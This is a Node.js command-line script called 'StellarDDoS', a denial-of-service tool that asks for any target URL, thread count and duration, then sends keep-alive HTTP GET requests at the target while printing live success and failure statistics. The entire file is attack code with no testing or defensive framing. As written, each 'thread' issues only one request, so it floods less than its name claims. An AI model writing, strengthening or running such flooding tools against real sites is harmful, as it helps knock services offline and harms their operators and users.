#!/usr/bin/env node
'use strict';

const net = require('net');
const http = require('http');
const https = require('https');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');

class StellarDDoS {
    constructor() {
        this.connections = new Set();
        this.stats = {
            totalRequests: 0,
            success: 0,
            failed: 0,
            startTime: 0
        };
        this.isRunning = false;
        this.animationChars = ['|', '/', '-', '\\'];
        this.animationIndex = 0;
    }

    async startAttack(target, options = {}) {
        if (this.isRunning) {
            console.log(chalk.red('Attack already running'));
            return;
        }

        const { threads = 50, duration = 30 } = options;
        this.isRunning = true;
        this.stats.startTime = performance.now();

        this.showStatsInterval = setInterval(() => this.showStats(), 100);
        this.animationInterval = setInterval(() => this.updateAnimation(), 100);

        try {
            const protocol = target.startsWith('https') ? https : http;
            const targetUrl = new URL(target);

            for (let i = 0; i < threads; i++) {
                this.createHttpConnection(protocol, targetUrl);
                await this.delay(50);
            }

            setTimeout(() => this.stopAttack(), duration * 1000);
        } catch (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            this.stopAttack();
        }
    }

    createHttpConnection(protocol, targetUrl) {
        const req = protocol.request({
            hostname: targetUrl.hostname,
            port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
            path: targetUrl.pathname,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Connection': 'keep-alive'
            }
        }, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                this.stats.success++;
                this.stats.totalRequests++;
                process.stdout.write(chalk.green('.'));
            });
        });

        req.on('error', () => {
            this.stats.failed++;
            this.stats.totalRequests++;
            process.stdout.write(chalk.red('x'));
        });

        req.setTimeout(5000, () => req.destroy());
        req.end();

        this.connections.add(req);
    }

    updateAnimation() {
        this.animationIndex = (this.animationIndex + 1) % this.animationChars.length;
    }

    stopAttack() {
        if (!this.isRunning) return;

        clearInterval(this.showStatsInterval);
        clearInterval(this.animationInterval);
        this.connections.forEach(req => req.destroy());
        this.connections.clear();

        const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
        console.log(chalk.green(`\nAttack completed in ${elapsed}s`));
        console.log(chalk.blue(`Total requests: ${this.stats.totalRequests}`));
        console.log(chalk.green(`Success: ${this.stats.success}`) + ' | ' + chalk.red(`Failed: ${this.stats.failed}`));

        this.isRunning = false;
        this.resetStats();
    }

    showStats() {
        const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
        const animChar = this.animationChars[this.animationIndex];
        process.stdout.write(`\r${chalk.greenBright(animChar)} ${elapsed}s | Requests: ${this.stats.totalRequests} | ` +
                            `${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}`);
    }

    resetStats() {
        this.stats = {
            totalRequests: 0,
            success: 0,
            failed: 0,
            startTime: 0
        };
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const stellar = new StellarDDoS();

rl.question(chalk.greenBright('Target URL: '), target => {
    rl.question(chalk.greenBright('Threads (50): '), threads => {
        rl.question(chalk.greenBright('Duration (30s): '), duration => {
            stellar.startAttack(target, {
                threads: parseInt(threads) || 50,
                duration: parseInt(duration) || 30
            });

            rl.on('line', (input) => {
                if (input.trim() === 'stop') {
                    stellar.stopAttack();
                    rl.close();
                }
            });
        });
    });
});

rl.on('close', () => {
    stellar.stopAttack();
    process.exit(0);
});